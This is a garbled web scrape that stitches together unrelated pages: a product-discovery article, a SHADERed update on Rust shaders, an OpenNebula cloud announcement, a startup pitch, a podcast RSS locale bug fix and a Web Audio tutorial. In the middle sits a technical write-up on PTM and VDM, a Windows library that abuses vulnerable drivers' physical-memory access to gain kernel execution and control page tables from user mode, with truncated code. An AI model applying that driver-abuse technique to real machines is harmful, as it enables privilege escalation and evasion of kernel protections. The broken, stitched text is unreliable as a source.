href="https://twitter.com/robfitz" rel="noopener">Rob</a> where he shared an updated model of 3 ways where users will lie to you if you’re not careful:</p><ol><li id="afa0">Asking the wrong questions</li><li id="6697">Remembering the wrong thing</li><li id="6a57">Making the wrong decision “justified” by what you think you heard</li></ol><p id="ecb1">Rob and most other researchers suggest asking for permission from their interviewees to record these interviews and take time-annotated notes that will help them to accurately remember and codify behavioral patterns that could eventually help to define <a href="https://www.uxmatters.com/mt/archives/2019/02/the-pitfalls-of-personas-and-advantages-of-jobs-to-be-done.php" rel="noopener">“jobs to be done”</a> that product, engineering, and design teams can build for with confidence.</p><p id="556d">After gaining insights about the problems your target market faces in generative research, you may be confident enough to test out a specific product solution to see if these users would actually value it.</p><p id="4717">This is the concept behind <strong>evaluative testing</strong>.</p><p id="f326">At this early stage, you want to put an <em>ultra-lightweight implementation </em>of a product solution in front of your target users to see how they react. While the closer to reality your prototype is the better, it doesn’t need to be a fully functional product yet: designs on paper, prototypes, mock-ups-anything like that will work.</p><p id="b1b0">Your goal at this stage is to get clear qualitative signals that users:</p><ol><li id="9f21">understand the proposed product solution</li><li id="fcda">express unmistakable excitement about the prospect of the product as a superior solution to the status quo</li></ol><p id="2033">Unfortunately, all too many product teams speed through this testing or skip it all together and simply march ahead to engineering and delivery. Depending on the complexity of the market and the problem you’re trying to solve, this stage could take months or, in some cases, years.</p><p id="d10d">That might sound discouraging and time-consuming, but I know this for certain: the success of your product will be <strong><em>directly proportiona</em>l</strong> to the quality of work done in this initial customer discovery phase. It’s worth doing it, and it’s certainly worth doing it well.</p><p id="0fd4">Even if your team creates something that people want, if customers can’t figure out how to use it, the product is dead in the water. This is why product teams conduct usability testing throughout the build process.</p><p id="ee09">The traditional approach to usability interviews is to set up a test environment, where we watch as a user navigates the product. An interviewer encourages a user to explain what they see, think, and observe. The interviewer also offers prompts for what the user might consider next if they get stuck using the product. Usability issues in the product become self-evident in most of these cases.</p><p id="8825">My friend <a href="https://medium.com/u/b2d49a9606e3?source=post_page-----c68feaecac44--------------------------------" target="_blank" rel="noopener">Behzod Sirjani</a>, has created a framework for conducting usability testing interviews where he recommends asking the participant about their:</p><ol><li id="084d">Expectation (about what will happen)</li><li id="4d83">Reaction (to what happens)</li><li id="64e1">Reflection (on the difference between 1 and 2)</li></ol><figure><div></div></figure><p id="ec98">A less scientific and more agile approach to identifying lower-hanging usability issues is concierge onboarding. In concierge onboarding, someone from your team guides — via video call is best — new users through setting up the product and answers the questions in real-time. Concierge onboarding helps the team member understand the steps users are asked to take and the ways those steps directly lead to value.</p><figure><div></div></figure><p id="2293">In a recent Zoom call with Behzod, he told me how at Slack it was essential to turn usability interviews into video highlights of moments of user struggle to help his team form a shared understanding of the problem and gain alignment around solutions that will actually work.</p><p id="5379">The best product teams never stop this work of generative and evaluative testing for new features. Even as their initial research and testing turns into a real product, they know the importance of creating a customer discovery and product delivery engine that never stops learning and growing.</p><p id="b7d9">It’s much more common for product teams to continually learn and discover from their existing users than it is for them to gather insights from completely unbiased non-users. But a balance between the two groups — existing and new — is ideal. New users can give you a better understanding of your initial product experience, and existing “power users” can offer you insights that come from living with a product for weeks or months.</p><p id="1af9">Great product teams develop long-standing relationships of trust with their most active users. You’ll often see the people on these teams setting up recurring feedback sessions to gain insight and listen to users’ concerns and ideas. The point of these interviews is to find out what’s delightful and what’s frustrating, what’s there and working well, and …</p></div></div></div>

<h2><b>Embark Studios</b></h2>
<p>I am thrilled to announce the newest SHADERed sponsor, <a href="https://embark-studios.com/">Embark Studios</a>. Embark Studios is a games studio based in Stockholm. They are heavily interested in <a href="https://www.embark.dev/">open-source</a> and <a href="https://medium.com/embarkstudios/inside-rust-at-embark-b82c06d1d9f4">Rust</a>. I definitely recommend you to visit their <a href="https://embark-studios.com/">website</a> and read more about the projects and games they are working on: <a href="https://medium.com/embarkstudios/our-continued-journey-89dad7a76bff">Medium article</a>.</p>
<p>I would also like to thank Embark Studios for the support!</p>
<p><img alt="Embark Studios" src="https://shadered.org/assets/blog/img/4/EmbarkSponsor.png"></p>
<h2><b>Rust shaders on web</b></h2>
<p>Almost two weeks ago I released a plugin for desktop version of SHADERed that adds the ability to write the shaders in Rust programming language. Getting that plugin to work might be difficult if you are new to Rust. Plus, if you just wanted to see how Rust shaders work and test out the syntax, it would be a hassle to set everything up (though I do recommend you to check out Rust!). I thought it would be nice if I brought them to the web, a place where everyone can try them out without having to install additional software. So, today I would like to extend the support for Rust shaders to SHADERed Lite - the web version of SHADERed.</p>
<p>This embedded shader below is 100% written in Rust. It is running in realtime and it's hosted on shadered.org:</p>


<p>You can test your changes on the "Quick edit" page without having to load the full SHADERed Lite IDE:</p>
<p><img alt="Rust quick edit" src="https://shadered.org/assets/blog/img/4/RustQuickEdit.gif"></p>
<p>Or you can press the "Fork" button to open the shader in 'Lite' version of SHADERed. There you can modify the project more extensively (add new variables, geometry objects, shader passes, textures, etc...):</p>
<p><img alt="Forking Rust project" src="https://shadered.org/assets/blog/img/4/RustFork.gif"></p>
<p>After you are done with your shader, you can upload it to shadered.org database so that everyone can see the shader in action and the code behind it (note that you must be logged in to upload it):</p>
<p><img alt="Rust shaders" src="https://shadered.org/assets/blog/img/4/RustShaders.png"></p>
<p>If you want to save it to your computer, hit the <code>File</code> -&gt; <code>Download</code> button and SHADERed will download the .zip file containing your project (for this action you do not have to be logged in). You can also save the SPIR-V binary of your Rust shaders through SHADERed Lite.</p>
<p><i>How does all of this work?</i><br>
I've set up a special server that I send Rust code to. The server then gives me back the build status, error messages and generated SPIR-V. The compile times are around ~1 second. Though, on first few days of launch it might be slower due to higher traffic. Be aware that the first ever compile takes very long, around 10 seconds or so. This is because the compiler has to build some additional Rust crates. But I've designed the server so that it creates a 'session' for the user so that even when you close your browser and then reopen it, the next build time will be ~1 second (the compiler won't have to build those additional crates again).<br>
I still recommend you to use the <a href="https://shadered.org/plugin?id=Rust">plugin</a> (if you've got everything set up required by <a href="https://github.com/EmbarkStudios/rust-gpu">rust-gpu</a>). This way you'll get the fastest possible compile times and you won't depend on any servers.<br>
All of this is possible thanks to this <strong>awesome <a href="https://github.com/EmbarkStudios/rust-gpu">rust-gpu</a> project</strong> made by Embark Studios! It is fully open source!</p>

<h2><b>Other changes</b></h2>
<p>Besides adding Rust shaders to the web version of SHADERed, I am also <strong>bringing the C++/Circle shaders to the web</strong> and I made some smaller changes to the website.</p>
<h3><b>C++ shaders in your browser</b></h3>
<p>The C++ shader addition to SHADERed Lite is currently more of an experiment. The <a href="https://shadered.org/circle-lang.org">circle</a> compiler sometimes crashes and sometimes the SPIR-V it produces causes the spirv-cross to throw an exception (and thus SHADERed Lite stops working). The compile times are also pretty long since I have to run the compiler in a virtualized environment (because of the <code>@meta</code>).</p>
<p>Since this is basically C++ you <em>should be able</em> to use stuff such as templates, std::complex, etc...</p>
<p><img alt="C++ shaders" src="https://shadered.org/assets/blog/img/4/CppShaders.png"></p>
<p>Similarly to Rust shaders, I definitely recommend you to rather use the <a href="https://shadered.org/plugin?id=CPP">plugin</a> (that is if you have Linux). The plugin doesn't require any additional software and the compile times are blazingly fast, they are almost instantaneous (unlike on the web version of SHADERed).<br>
Check out the <strong> <a href="https://shadered.org/circle-lang.org">circle</a> project </strong> that made this possible and it's creator <a href="https://twitter.com/seanbax">Sean Baxter</a>.</p>

<h3><b>Website changes</b></h3>
<p>Some smaller changes include:</p>
<ul>
<li>
<p>new syntax highlighting in the "Quick edit" page<br>
<img alt="New syntax highlighting" src="https://shadered.org/assets/blog/img/4/NewSyntaxHighlight.png"><br></p>
</li>
<li>
<p>'<code>Save SPIR-V binary</code>' option<br>
<img alt="Saving SPIR-V from within browser" src="https://shadered.org/assets/blog/img/4/SaveSPIRV.gif"><br></p>
</li>
<li>
<p>added the <a href="https://shadered.org/theme?id=vsdark">VSDark</a> theme<br>
<img alt="New VSDark theme" src="https://shadered.org/assets/blog/img/4/NewVSDarkTheme.png"><br></p>
</li>
<li>
<p>added sponsors to the loading page of SHADERed Lite<br>
<img alt="Sponsors" src="https://shadered.org/assets/blog/img/4/Sponsors.png"><br></p>
</li>
<li>
<p>notification button now shows the number of unread notifications:<br>
<img alt="Updated notifications" src="https://shadered.org/assets/blog/img/4/Notifications.png"><br></p>
</li>
<li>
<div><p>the compiler used on the "Quick Edit" page is now 4 times lighter, so now when you hit the "Compile" button for the first time it should hopefully load the compiler <code>.js</code> file faster.</p></div>
</li>
</ul>
<h3><b>Terminal plugin</b></h3>
<p>Another thing worth mentioning is probably the <a href="https://shadered.org/plugin?id=Terminal">terminal plugin</a>. This plugin lets you open terminal (PowerShell, CMD, WSL) windows inside SHADERed. While mostly useless for shader development, it lets you (for example) run the actual Vim within SHADERed<br>
<img alt="Vim and SHADERed" src="https://shadered.org/assets/blog/img/4/UsingVim.gif"><br></p>

<p>Today we are happy to announce a new, powerful <a rel="noreferrer noopener" href="https://opennebula.io/true-hybrid/" target="_blank">True Hybrid Cloud Architecture</a> for OpenNebula. This reference architecture is composed of hybrid clusters that can run <strong>any workload</strong>, both virtualized and containerized, on <strong>any resource</strong>, physical or virtual, <strong>anywhere</strong>, on-premises and on the cloud.</p>



<p>Our <strong>True Hybrid Cloud Architecture</strong> implements enterprise-grade features for performance, availability and scalability with <strong>a very simple design</strong> that enables workload portability across geographic distributed clusters, <strong>avoids vendor lock-in</strong> and reduces complexity, resource consumption and operational costs across the board.</p>







<div><figure><img src="https://opennebula.io/wp-content/uploads/2020/12/Consolidated-Infra-Cluster.png" alt="" width="661" height="398"></figure></div>







<p>Now more than ever, IT departments need the right blend of on-premises, public and edge cloud environments to support the collection of existing and emerging use cases. They also need to <strong>combine virtual machine workloads with application containers in a shared environment</strong> that can offer the best of both worlds—mature virtualization technology and secure container orchestration.</p>



<p>Over a decade’s worth of experience working with hundreds of users and customers has helped us define a <strong>True Hybrid Cloud Architecture</strong> that is much simpler than the traditional cloud computing architectures made of complex, proprietary general-purpose software systems for storage and networking. This one builds upon storage and networking technologies that already exist in the Linux operating system and modern storage hardware that are available from existing cloud and edge providers, leading to a greatly simplified design.</p>



<p>The <strong>True Hybrid Cloud Architecture</strong> will be the recommended and <a rel="noreferrer noopener" href="https://opennebula.io/true-hybrid/" target="_blank">commercially supported cloud configuration</a> for hybrid and edge computing with OpenNebula. While support for this architecture won’t be available to the general public until the next version of OpenNebula (due in January 2021), in the following days we are announcing the delivery of cloud deployment services, enterprise support and managed services for <strong>OpenNebula 5.12 </strong>clouds<strong> </strong>based on this innovative architecture. You can enjoy a <strong>single vendor experience</strong> with a <strong>complete cloud stack fully supported and managed by OpenNebula Systems</strong>. This ultimately affords a simplified experience for procurement, consulting, support and management.</p>

                </p>
                <p>

                  There are different reasons why this has happened, but one of the main reasons is that the way we work hasn't really changed. When companies started shifting their workforce to a remote model, they took the tools they were already using (e.g. Slack, Zoom) and sent their employees home.
                </p>
                <p>
                  These tools are now being used in the same way they were used in the office, where most of the interaction happened in real-time.

                  A quick chat is now another Zoom meeting in a long succession of meetings and a tap on the shoulder is yet another Slack message that pulls you away from what you were doing.
                  This firehose of messages and meetings is not sustainable as it leads to <a href="https://www.cnbc.com/2020/07/28/remote-work-burnout-is-growing-as-coronavirus-pandemic-stretches-on.html">anxiety</a>, <a href="https://www.fastcompany.com/90554935/the-red-flag-signs-you-may-be-burning-out-while-working-from-home">burnout</a> and <a href="https://www.forbes.com/sites/bryanrobinson/2020/09/06/how-remote-workers-can-recognize-burnout-and-6-actions-to-take/?sh=64da6cf14326">pressure</a> to always be connected.

Most people agree that whatever happens, companies will be way more distributed than they were before the pandemic.
                  One thing is for sure -- the communication &amp; collaboration tools that exist today just don't cut it.

                  <b>This is where <a href="http://rock.so/">Rock</a> comes in</b>. <a href="https://www.linkedin.com/in/liming/">Ming</a> and I started building Rock about a year ago to make it easier to shift towards a <a href="http://rock.so/about">more asynchronous way of working</a>. This way of working gives you <b>more control</b> over your workday, makes you <b>more productive</b> while <b>reserving face-to-face meetings</b> for the most important things. It's also ideally suited to a workforce that is more distributed.
                </p>
                <p>
                  With the right tools and mindset, working with your team becomes more like a <b>relay race</b>. Everybody knows what's going on, you can pick things up when you're ready, and work happens in a state of flow.

              <div>
                <p>
                  Rock combines real-time messaging and video calls with more asynchronous ways of communicating like <a href="http://rock.so/tasks">tasks</a>, <a href="http://rock.so/notes">notes</a>, and <a href="http://rock.so/files">files</a> and makes this available in <a href="http://rock.so/product">one space</a>. Because we combine these different types of communication, we make it easy for you to pick and choose the best way to interact with your team. We also work with Google Drive (and will work with Zoom and others soon) so it's easier to tap into your existing workflows.
                </p>
                <p>
                  When you <a href="http://rock.so/better-than-slack">compare Rock to Slack</a> you can easily see why we think Rock just works better for how work happens today.

                  It's our mission to <b>build tools to empower anyone to work from anywhere</b>. When this happens - companies are more diverse, job opportunities are not limited by location and we all meet less, while doing more.

		<p>I fixed a bug that sporadically made Spotify remove my show, <a target="_blank" href="https://gettingsimple.com/podcast">the Getting Simple podcast</a>, from its platform without any logical explanation and, more worrisome, without warnings or notifications.</p>
<hr>
<p>Some time ago, I noticed the podcast's RSS feed displayed episode release dates localized in Chinese and other languages. Something that, to my eyes, seemed random. Yesterday, I finally identified the issue.</p>
<p>The XML feed is cached for thirty minutes at a time — a duration I set to avoid overloading the server by re-generating the feed on every request.</p>
<p>But this feed re-generation used the requesting party's "locale." This code corresponds to the language and region configured in the system that performs a web request. For instance, the <code>en-US</code> locale represents a visitor or bot configured to use the English language and the United States region. A localized site — that can adjust its content to different locales — would display a date as <code>Wed, 02 Dec 2020</code> for <code>en-US</code> visitors and as <code>Mié., 02 Dic. 2020</code> for <code>es-ES</code> visitors.</p>
<pre><code>date('D, d M Y H:i:s O');
// returns "Wed, 02 Dec 2020 05:19:14 -0500"
</code></pre>
<p>This <code>date('D, d M Y H:i:s O')</code> PHP method uses the operating system's language and region to determine what to display, but a localized website can adjust to the visitor's locale or even comply with explicit requirements.</p>
<pre><code>App::setLocale('en-US'); // force locale to en-US

Item::formatDate(Date::now(), 'D, d M Y H:i:s O')
// returns "Wed, 02 Dec 2020 05:22:55 -0500"

App::setLocale('es-ES'); // force locate to es-ES

Item::formatDate(Date::now(), 'D, d M Y H:i:s O')
// returns "Mié., 02 Dic. 2020 05:22:55 -0500"
</code></pre>
<p>The issue was that the re-generation of the podcast feed was dependent on the requesting agent's locale when the cache expired, which could be any user or bot. Spotify was pinging the podcast and could load a feed generated by an agent that used a locale other than English in the past thirty minutes.</p>
<pre><code>App::setLocale('en-US');
// Generate episode timestamps here
</code></pre>
<p>When Spotify found dates were not in English, it removed the show altogether—something that Apple Podcasts and other networks didn't do—and then added the podcast back hours later, when episode dates were in English again.</p>
<p><img src="https://nono.imgix.net/folio/images/veil.gif" data-src="https://nono.imgix.net/img/u/post-why-spotify-removed-my-show-player.png" alt="Spotify player showing a Getting Simple episode."></p><p>Spotify took its time to reload all existing episodes after forcing the localization of episode timestamps to use the <code>en-US</code> locale and re-generating the feed. Now all episodes and their stats are back. Hopefully, the show won't disappear again, and users won't hit this ugly, erroring embedded player.</p>

You can download the source from the open source repo here: <a href="https://githacks.org/_xeroxz/PTM">VDM Repo</a>.</p>

<hr>
<p>PTM is a Windows 10 C++ library that allows a programmer to manipulate all memory, physical, and virtual from user-mode. The project inherits an interface from VDM allowing the use of a physical memory read-write primitive to fuel this project. VDM is used solely to configure the page tables in such a way that PTM can manage them from user-mode. Once the page tables are configured for PTM VDM is no longer required. However, VDM can inherit an instance of PTM as a means to read and write physical memory. Both VDM and PTM work extremely well together and independently from each other.</p>

<hr>
<p>Page table manipulation is an extremely powerful primitive. One that allows groundbreaking projects to be created such as patching the kernel only in specific process-contexts, or mapping of a source process address space into a target process address space. PTM is a user-mode library that allows a programmer to manipulate page tables from user-mode on 64-bit Windows 10 systems. PTM does this by using VDM; a project designed to abuse vulnerable drivers exposing a physical memory read-write primitive (RWP) to elevate to arbitrary kernel execution. VDM is used to configure the page tables in such a way that they can be managed from user-mode without the need for VDM’s vulnerable driver being loaded into the kernel after initialization. PTM can then be used to get and set all levels of page table entries, translation linear virtual addresses from user-mode, map physical memory into virtual memory, and even create new page tables. PTM can also be used as a means to directly read and write physical memory, thus it can be used with VDM to leverage arbitrary kernel execution without the need of VDM’s vulnerable driver being loaded into the kernel.</p>

<hr>
<p>Paging is the concept of breaking memory into fixed-sized chunks called pages. Pages can be moved in and out of physical memory allowing for memory that is not accessed frequently to be moved to disk. In order for this to work, the CPU cannot directly interface with physical memory instead the CPU interfaces with virtual memory. Virtual addresses are translated to physical addresses using a set of tables called page tables. On a 64-bit system with the CPU in long mode, there are four layers of page tables: PML4(s), PDPT(s), PD(s), and lastly PT(s). All page tables are the same size (1000h bytes) unless configured otherwise. Each page table entry is eight bytes in size. This means that each table contains 512 entries (8 * 512 = 1000h). The last twelve bits of every virtual address is called the page offset and is an offset into a physical page. The page offset of a virtual address can be bigger than 12 bits depending on the paging structure configuration for a given virtual address. The length of the page offset field can be either 12 bits (physical page is 4kB), 21 bits (2MB physical page), or 30 bits (1GB page).</p>
<p><img src="https://imgur.com/IqB4B22.png"></p><p>In order to translate linear virtual addresses to linear physical addresses, the page tables must be traversed. As depicted in figure one, each virtual address space has its own PML4, the physical address of this table is stored in CR3.</p>

<hr>
<p>On Windows, the thread scheduler utilizes KPROCESS.DirectoryTableBase when scheduling threads. The KPROCESS structure is a substructure of the EPROCESS structure and contains DirectoryTableBase at offset 28h. A programmer using VDM can obtain the linear physical address of the PML4 of a process easily by DKOM’ing a desired process KPROCESS structure.</p>
<pre><code>kd&gt; dt !_KPROCESS ffffc38759d9e080
nt!_KPROCESS
   +0x000 Header           : _DISPATCHER_HEADER
   +0x018 ProfileListHead  : _LIST_ENTRY 
   +0x028 DirectoryTableBase : 0x00000001`15684000
   +0x030 ThreadListHead   : _LIST_ENTRY 
   +0x040 ProcessLock      : 0
   +0x044 ProcessTimerDelay : 0
   +0x048 DeepFreezeStartTime : 0
</code></pre><p>Once the physical address of the desired processes PML4 has been obtained the trick is interfacing with the paging structures. Although VDM allows reading and writing of physical memory, be aware that MmMapIoSpace cannot be used to map the paging structures into virtual memory. Drivers that use MmCopyMemory and ZwMapViewOfSection to interface with physical memory can however be used to directly manipulate the page tables. To properly support VDM which PTM inherits as a codebase, the project does not rely on the physical read and write primitive exposed from the driver. Instead PTM allocates its own set of page tables and inserts a PML4E into the current processes PML4 pointing at such tables. This allows a programmer to map physical memory at will into the current virtual memory address space, all from user-mode. In other words, once the tables are allocated and configured, there is no need for VDM anymore since the paging tables can be controlled entirely from user-mode.</p>

<hr>
<p>The translation look-aside buffer is a hardware-based cache that assists in translating linear virtual addresses to linear physical addresses. The TLB caches virtual to physical address translations, as well as other information like page access rights and cache type information. Although extremely important for efficiency, the TLB has made PTM an interesting challenge. For example, when physical memory is mapped into a virtual address space, page table entries will be inserted, or changed. This insertion or alteration of an existing page table entry may be of a cached entry in the TLB. This means that the effects applied to the page table entry will not be seen until the TLB entry for the given virtual page has been invalidated, along with the changes written to main memory. To counteract this, the CPU has an instruction that allows a programmer to invalidate a page table entry in the TLB’s cache. This instruction is called INVLPG and is a privileged instruction. It’s not something PTM can use since the library is designed to operate entirely from user-mode. Directly invalidating TLB is not the only way to invalidate entries. If a page fault occurs, the TLB invalidates entries for the given address that caused the fault (the address in CR2). This is an effective method for invalidating desired virtual addresses from user-mode but is extremely slow. Context switches do not inherently cause the TLB to flush, rather the PCID is changed to another PCID. This allows the TLB to retain entries from multiple address spaces and improve performance. However, yielding execution can invalidate TLB entries because the scheduler will reschedule the logical processor to execute somewhere else for some time, possibly filling the TLB with other entries and removing the ones that were previously cached.</p>
<h3 id="tlb_outrun"><a href="#tlb_outrun">TLB - Outrun</a></h3>
<hr>
<p>Although the TLB is an effective hardware-based cache, it cannot cache linear virtual addresses that have not been accessed before, this simple fact means a programmer can create a new linear virtual address every single time they would want to map a new physical page into virtual memory. This, however, is not a solid solution that works soundly on all modern CPUs. With the industry pushing forward with virtualization technology, the expansion of the TLB continues. Thus solely generating a new linear virtual address every time you would want to interface with a physical page is not a sound solution and is already unstable on most modern AMD chips. Instead combining this technique with other techniques is ideal.</p>
<div><pre><code data-lang="cpp"><span>auto</span> ptm_ctx<span>::</span>map_page(<span>void</span><span>*</span> addr) <span>-&gt;</span> <span>void</span><span>*</span>

	<span>++</span>pte_index;

	{
		<span>++</span>pde_index;

	}

	{
		<span>++</span>pdpte_index;

	}

	<span>if</span> (pdpte_index <span>&gt;</span> <span>511</span>)

	<span>// insert paging table entries down here…

</span><span></span>	<span>// returns the newly generated virtual address...
</span><span></span>	<span>return</span> <span>get_virtual_address</span>();
}
</code></pre></div><p>The code above generates a new linear virtual address that has not been accessed before. This linear virtual address points to the requests physical page in memory. This allows the programmer to circumvent the TLB by accessing new linear virtual addresses instead of trying to invalidate TLB entry of an existed and already cached page. This however has limitations since the code only provides 512^3 different possible virtual pages.</p>
<h3 id="tlb_benefit_of_the_doubt"><a href="#tlb_benefit_of_the_doubt">TLB - Benefit of The Doubt</a></h3>
<hr>
<p>Although outrunning the TLB is the fastest solution for mapping physical memory into virtual memory without needing to invalidate any TLB entries, it is not the most stable on modern hardware. Instead, a mixture of generating a new virtual address and an SEH try/except loop is preferred. By giving the new virtual address the benefit of the doubt that it has not been cached yet, an attempt to access the newly created page is performed. If the access is successful, the new linear virtual address is returned to the caller of ptm::ptm_ctx::map_page. However, if the access causes a page fault, the TLB invalidates the entries associated with this newly created linear virtual address. The except block then attempts to access the new page in a loop whilst yielding execution at each failure to access the new virtual address. This technique provides the most performant solution to dealing with the TLB from user-mode. This method guarantees that the linear virtual address generated is accessible before returning it to the caller.</p>
<div><pre><code data-lang="cpp"><span>auto</span> ptm_ctx<span>::</span>get_virtual_address() <span>const</span> <span>-&gt;</span> <span>void</span><span>*</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p> <iframe src="https://www.youtube.com/embed/laCjGMhASp8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""> </iframe> </p>
<p>The Web Audio API is incredibly powerful, with great support in every modern browser. It gives web developers tools to add effects to audio, create audio visualizations, generate audio, and much more.</p>
<p>Today, we’ll be diving into the basics of the Web Audio API by creating a soundboard which allows us to click a button on the web page and play a synthesized sound. We’ll generate sound effects for a drum kit, along with a few melodic tones.</p>
<p>Portions of this article were adapted from <a href="https://dev.opera.com/articles/drum-sounds-webaudio/" rel="nofollow">this article</a> by Chris Lowis.</p>
<h2>How does the Web Audio API work?</h2>
<p><img src="https://ui.dev/post-images/modules.jpg" alt="Modules"></p>
<p>The Web Audio API is based on the concept of modular routing, which has its roots in analog synthesizers. There are audio <em>sources</em>, such as microphones, oscillators, and audio files, which provide some kind of audio signal.</p>
<p>Those audio signals can be connected to other audio nodes which perform operations with that signal. These nodes include the Gain Node, which can raise or lower the volume of a signal; Filter Nodes, which changes how the signal sounds; and an Analyser Node, which provides real-time information about a signal which can be used to render a visualization.</p>
<p>Finally, our audio signal is passed to an output node, which plays the signal through our computer’s speakers.</p>
<p>Analog synthesizers use wires and circuits to create the audio nodes and connections; with the Web Audio API, we use code.</p>
<h2>A Primer on Computer Audio</h2>
<p>Sounds works through continuous waves in the air which our ears are able to detect. These waves move at varying frequencies, which our brain interprets as different pitches. Higher frequencies mean higher pitch. The height of each peak in the wave indicates its amplitude, or power. Waves with a high amplitude are interpreted by our brains as higher volume.</p>
<p>If you want to learn more about waveforms, you should check out <a href="https://pudding.cool/2018/02/waveforms/" rel="nofollow">this excellent primer</a> by Josh Comeau.</p>
<p>The problem with computers is they can’t process or store continuous data; computer processors can only handle one bit of data at any moment. That means when working with audio in a computer, we actually use discrete signals, which take the continuous signal and convert it into a sequence of samples, each representing what the frequency and amplitude of the signal was at that moment in time.</p>
<p>This is why the sample rate is so important to audiophiles - the more samples you can fit into a second of audio, the more accurate the representation is. However, it isn’t a 1-to-1 match of signal frequency to sample rate. For example, the range of human hearing is 20 - 20,000 Hertz (Hz). To capture enough samples to represent that range of frequencies, you actually need more than double the source frequency. That’s why the sample rate of CDs is 44,100 Hz, or 44,100 samples per second. This is also the default sample rate for the Web Audio API.</p>
<p>You might also have two streams of audio are stored together, such as in a stereo audio clip. The separate streams are called channels, and in stereo they correspond to the left and right speakers. If your audio has 5.1 surround sound, then it would have 6 separate channels: front left and right, center, back left and right, and the subwoofer.</p>
<h2>The AudioContext</h2>
<p>All of the work we do in the Web Audio API starts with the AudioContext. This is an object that gives us access to all of the other objects and constructors that we’ll use as we create audio. You can think of it like <code>document</code> or a canvas context, but for Web Audio.</p>
<p>We create the audio context using the <code>AudioContext()</code> constructor.</p>
<div data-language="js"><pre><code><span>const</span> audioContext <span>=</span> <span>new</span> <span>AudioContext</span><span>(</span><span>)</span><span>;</span></code></pre></div>
<p>Not every browser has full support for the Web Audio API. If you want to make your audio application work for all browsers, check out <a href="https://developer.mozilla.org/en-US/docs/Web/Guide/Audio_and_video_delivery/Web_Audio_API_cross_browser" rel="nofollow">this article on MDN</a> for some helpful tips.</p>
<h2>Generating Audio in JavaScript</h2>
<p>Since the Web Audio API is used in a JavaScript environment, audio has to be stored in a way that JavaScript can understand. This is done using audio buffers, which can be created with the <code>.createBuffer</code> method on the audio context. We have to pass it the number of channels in the buffer, the number of samples that the buffer holds, and the sample rate.</p>
<div data-language="js"><pre><code><span>const</span> <span>SAMPLE_RATE</span> <span>=</span> audioContext<span>.</span>sampleRate<span>;</span>
<span>const</span> timeLength <span>=</span> <span>1</span><span>;</span> 

<span>const</span> buffer <span>=</span> audioContext<span>.</span><span>createBuffer</span><span>(</span>
  <span>1</span><span>,</span>
  <span>SAMPLE_RATE</span> <span>*</span> timeLength<span>,</span>
  <span>SAMPLE_RATE</span>
<span>)</span><span>;</span></code></pre></div>
<p>This gives us a mono (one channel) buffer that holds 1 second worth of audio data.</p>
<p>If we wanted to read the data in the buffer (which is currently empty), we could use the <code>.getChannelData()</code> method. We need to pass in <code>0</code> to specify which channel we want data for. This returns a <code>Float32Array</code> where each item is a number representing the level of that sample.</p>
<div data-language="js"><pre><code><span>const</span> channelData <span>=</span> buffer<span>.</span><span>getChannelData</span><span>(</span><span>0</span><span>)</span><span>;</span>
</code></pre></div>
<p>We can then mutate the channel data directly. By assigning a random value between -1 and 1, we can create white noise.</p>
<div data-language="js"><pre><code><span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> buffer<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
  channelData<span>[</span>i<span>]</span> <span>=</span> Math<span>.</span><span>random</span><span>(</span><span>)</span> <span>*</span> <span>2</span> <span>-</span> <span>1</span><span>;</span>
<span>}</span></code></pre></div>
<blockquote>
<p>Note: If our buffer had more than one channel, we would have to repeat this process for every channel.</p>
</blockquote>
<p>Now we have a snippet of audio that contains one second of white noise. There’s still more that we need to do before we can play it.</p>
<h2>Creating Audio Nodes</h2>
<p>We can now create a buffer source, which is an audio node that handles playing our audio buffer.</p>
<div data-language="js"><pre><code><span>const</span> whiteNoiseSource <span>=</span> audioContext<span>.</span><span>createBufferSource</span><span>(</span><span>)</span><span>;</span>
whiteNoiseSource<span>.</span>buffer <span>=</span> buffer<span>;</span></code></pre></div>
<p>We can now connect this audio node to another audio node, including the audio context destination node. The destination node is a special node that is attached directly to the audio context. It represents whatever speakers are configured to play audio on our users computer.</p>
<p>Before we connect our white noise to the destination, we’ll want to turn the volume down to make sure we don’t blow our eardrums out. We’ll create a gain node, which lets us control the volume. Then we’ll connect our audio source node to the gain, and connect it to the destination node.</p>
<div data-language="js"><pre><code><span>const</span> primaryGainControl <span>=</span> audioContext<span>.</span><span>createGain</span><span>(</span><span>)</span><span>;</span>
primaryGainControl<span>.</span>gain<span>.</span><span>setValueAtTime</span><span>(</span><span>0.05</span><span>,</span> <span>0</span><span>)</span><span>;</span>

whiteNoiseSource<span>.</span><span>connect</span><span>(</span>primaryGainControl<span>)</span><span>;</span>
primaryGainControl<span>.</span><span>connect</span><span>(</span>audioContext<span>.</span>destination<span>)</span><span>;</span></code></pre></div>
<p>You might be wondering why we’re using the strange <code>setValueAtTime</code> method. The Web Audio API is designed to orchestrate complex changes the parameters of the audio nodes. The <code>gain</code> property on our gain node is an <a href="https://developer.mozilla.org/en-US/docs/Web/API/AudioParam" rel="nofollow">AudioParam</a> and has a lot of other methods which make it possible to adjust different audio node parameters in controlled ways.</p>
<p>The first parameter of the <code>setValueAtTime</code> is the value we are setting; in this case, the gain. The gain value is unitless, and the amplitude of the audio that passes through our gain node is multiplied by that gain value. Using a value less than 1 decreases the volume; greater than 1 would increase the volume.</p>
<p>The second parameter is the time that the value is set, based on the internal clock of the audio context. This allows us to precisely schedule changes to the properties of our various audio nodes. Using 0 here sets the gain value at the very start of our audio.</p>
<p>If you’ve been following along, you might be expecting some noise to come out of your speakers right now. Just connecting our audio node to the destination doesn’t make it play - you have to call the <code>start</code> method on the source node. Let’s create a button that we can click to play the sound.</p>
<div data-language="js"><pre><code><span>const</span> button <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>"button"</span><span>)</span><span>;</span>
button<span>.</span>innerText <span>=</span> <span>"White Noise"</span><span>;</span>
button<span>.</span><span>addEventListener</span><span>(</span><span>"click"</span><span>,</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  whiteNoiseSource<span>.</span><span>start</span><span>(</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span>

document<span>.</span>body<span>.</span><span>appendChild</span><span>(</span>button<span>)</span><span>;</span></code></pre></div>
<p>Click the button, and you should hear <del>music to your ears</del> generated white noise!</p>
